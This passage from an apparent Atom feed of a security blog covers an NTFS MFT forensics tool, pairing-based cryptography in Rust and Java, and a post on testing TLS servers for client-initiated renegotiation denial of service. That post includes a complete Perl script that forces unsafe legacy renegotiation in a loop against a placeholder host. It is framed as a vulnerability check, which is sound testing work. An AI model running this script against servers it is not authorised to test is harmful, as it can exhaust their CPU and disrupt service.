<p>You might think that "non-base MFT entries do not have the <code>$FILE_NAME</code> and <code>$STANDARD_INFORMATION</code> attributes in them", as Brian Carrier has stated in his great book. But we found that this does happen. Further investigation showed us that nearly all fast and simple tools have the same problem. So this was the last bit that led us write a tool for our own.</p>
<h1>What are the advantages of this tool?</h1>
<ul>
<li>way more faster than <code>analyze_mft.py</code></li>
<li>all files are displayed, even if they don't have a '$FILENAME' (Really??? Files can have no filename? Yes, they can. See below)</li>
</ul>
<h1>What are the limits of this tool?</h1>
<p>Consider the following situation: You have a file, which has a lot of attributes. The list of attributes is so long, that it cannot be stored in an <code>$MFT</code> entry. So, the <code>$ATTRIBUTE_LIST</code> attribute is stored as a nonresident attribute, outside the <code>$MFT</code>. At the moment, <code>mft2bodyfile</code> is not able to find the corresponding <code>$MFT</code> entries, and will generate a filename.</p>
<p>Can we fix this? Yes, we can. If we detect such a situation, we can search the <code>$MFT</code> entries which refer to our base entry, and use those to find a <code>$FILE_NAME</code> attribute.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="update-fixed-in-050">Update: fixed in <em>0.5.0</em><a class="hash-link" aria-label="Direct link to update-fixed-in-050" title="Direct link to update-fixed-in-050" href="https://janstarke.github.io/blog/2021/05/16/mft2bodyfile#update-fixed-in-050">​</a></h2>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[DoSing TLS endpoints]]></title>
        <id>https://janstarke.github.io/blog/2021/03/25/DoSing-TLS-endpoints</id>
        <link href="https://janstarke.github.io/blog/2021/03/25/DoSing-TLS-endpoints"/>
        <updated>2021-03-25T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.]]></summary>
        <content type="html"><![CDATA[<p>During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.</p>
<p>Negotiating a shared secret requires a lot of computation and thus needs some CPU time. The idea of the attack is to initiate a TLS connection and then request a renegotiation of the shared secret over and over again. This would consume a lot of CPU time from the server, which is the resource we're going to exhaust.</p>
<h1>The test</h1>
<p>To exploit the vulnerability, you must make sure that the client consume much less CPU time than the server does. So, you have to tweak the renegotiation. I didn't do this, becaus I wasn't interested in really exhausting the server resources. I was only interested in the following questions:</p>
<ul>
<li>Does the server really support client-initiated renegotiation?</li>
<li>How many renegotiations are allowed by the server before it terminates the connection?</li>
</ul>
<h1>What did I learn?</h1>
<p>Most TLS implementations have removed the client-initiated renegotiation from its source code, so If you use an up-to-date implementation, chances are good that you are not vulnerable.</p>
<h1>Expoit source code</h1>
<div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use Socket;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use Net::SSLeay qw(die_now die_if_ssl_error) ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use strict;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use warnings;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use Errno qw(EINTR EIO :POSIX);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use IO::Socket::INET;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::load_error_strings();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::SSLeay_add_ssl_algorithms();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::randomize();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $hostname = "&lt;yourhost&gt;";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $port = "443";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $request = "HEAD / HTTP/1.1\r\n\r\n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub error_name($) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $id = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my @errors = (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_NONE',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_SSL',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_WANT_READ',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_WANT_WRITE',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_WANT_X509_LOOKUP',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_SYSCALL',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_ZERO_RETURN',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_WANT_CONNECT',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        'SSL_ERROR_WANT_ACCEPT'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die "invalid error number" unless $errors[$id];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $result;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return $errors[$id];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub display_result($$$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ssl = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $result = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $function = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die_if_ssl_error("ssl $function ($!)");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (0 != (my $error_id = Net::SSLeay::get_error($ssl, $result))) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        my $error = error_name($error_id);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print ("$function() = $error\n");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        while (0 != (my $rv = Net::SSLeay::ERR_get_error())) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            my $error_desc = Net::SSLeay::ERR_error_string($rv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            print ("stack: $error_desc\n");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub set_options($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $option = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::CTX_set_options($ctx, $option)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     and die_if_ssl_error("ssl ctx set options ($!)");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub set_version($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $version = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::CTX_set_ssl_version($ctx, $version)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     and die_if_ssl_error("ssl ctx set version ($!)");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub set_ciphers($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ciphers = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::CTX_set_cipher_list($ctx, $ciphers)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     and die_if_ssl_error("ssl ctx set ciphers suites ($!)");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub ssl_connect($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $socket = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ssl = Net::SSLeay::new($ctx) or die_now("Failed to create SSL $!");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::set_fd($ssl, $socket-&gt;fileno);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $res = Net::SSLeay::connect($ssl) and die_if_ssl_error("ssl connect ($!)");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $error = error_name(Net::SSLeay::get_error($ssl, $res));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print ("connect() = $error\n");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print "Cipher `" . Net::SSLeay::get_cipher($ssl) . "'\n";</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return $ssl;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub configure_context($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ciphers = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_options($ctx, &amp;Net::SSLeay::OP_ALL);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_options($ctx, &amp;Net::SSLeay::OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    #set_options($ctx, &amp;Net::SSLeay::OP_SSL_OP_LEGACY_SERVER_CONNECT);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_version($ctx, &amp;Net::SSLeay::TLSv1_2_method);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_ciphers($ctx, $ciphers);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $socket = IO::Socket::INET-&gt;new(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Type =&gt; IO::Socket::SOCK_STREAM,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Proto =&gt; 'tcp',</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PeerAddr =&gt; $hostname,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PeerPort =&gt; $port,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Blocking =&gt; 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) or die ("unable to connect: $!\n");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ctx = Net::SSLeay::CTX_new() or die_now("Failed to create SSL_CTX $!");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">configure_context($ctx, "DHE:EDH:ECDHE:EECDH:RSA:DH:ECDH");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ssl = ssl_connect($ctx, $socket);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ret;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for (my $i=0; $i&lt;2; $i++) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::renegotiate($ssl);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die_if_ssl_error("ssl renegotiate ($!)");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (! $socket-&gt;connected()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die("network connection has died");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret = Net::SSLeay::do_handshake($ssl);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    display_result($ssl, $ret, "do_handshake");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::free ($ssl);               # Tear down connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::CTX_free ($ctx);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">close $socket;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Pairing based cryptography in Rust]]></title>
        <id>https://janstarke.github.io/blog/2021/02/13/Pairing_based_cryptography_in_Rust</id>
        <link href="https://janstarke.github.io/blog/2021/02/13/Pairing_based_cryptography_in_Rust"/>
        <updated>2021-02-13T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Because I was was fed up with catching memory issues in the legacy PBC code, I decided to reimplement the PBC library using Rust. You can watch my progress at https://github.com/teeshop/pbc4rust.]]></summary>
        <content type="html"><![CDATA[<p>Because I was was fed up with catching memory issues in the legacy PBC code, I decided to reimplement the PBC library using Rust. You can watch my progress at <a href="https://github.com/teeshop/pbc4rust" target="_blank" rel="noopener noreferrer">https://github.com/teeshop/pbc4rust</a>.</p>
<p>By the way, I like the concept of traits. This enables me to rely on the rules of universal algebra. So, my first unit tests look like this:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[test]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_z_add_zero</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">12345</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">zero</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">zero</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[test]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_z_add_commutativity</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">12345</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6789</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[test]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_z_add_associativity</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3456</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3456</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">b </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Using Pairing-based cryptography in Java]]></title>
        <id>https://janstarke.github.io/blog/2021/02/05/Using_pairing_based_cryptography_in_Java</id>
        <link href="https://janstarke.github.io/blog/2021/02/05/Using_pairing_based_cryptography_in_Java"/>
        <updated>2021-02-05T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Since some years I'm working on this topic, and guess what-)]]></summary>
        <content type="html"><![CDATA[<p>Since some years I'm working on this topic, and guess what: It is working now :-)</p>
<p>Imagine the following: You are in a hospital and get some test results (e.g. from a Covid-19 test). You want to protect the result by encrypting it, but you are not sure who needs to be able to read that result later. But you don't want to decrypt and reencrypt the result later. This is, where PBC comes in play. You can do as 2nd-level encryption, which protects the data from being read by any person. To decrypt 2nd-level encrypted data, you must first convert that to 1st-level-encrypted data, which requires the public key of the person you want to grant access to you data, and your own private key. After this step, the person for who you created the 1st-level encrypted data can decrypt the data using its own private key.</p>
<p>This enables the following use cases:</p>
<ul>
<li>Storage of confidential data in a cloud which you don't trust, while giving partners access to your data. This works as long as the cloud provider doesn't know any private keys. It even allows the cloud provider to do the transformation from 2nd-level to 1st-level, if you calculate the reencryption-key on-premise.</li>
<li>Revocation of data access by revoking the reencryption key.</li>
</ul>
<h1>What happened until now?</h1>
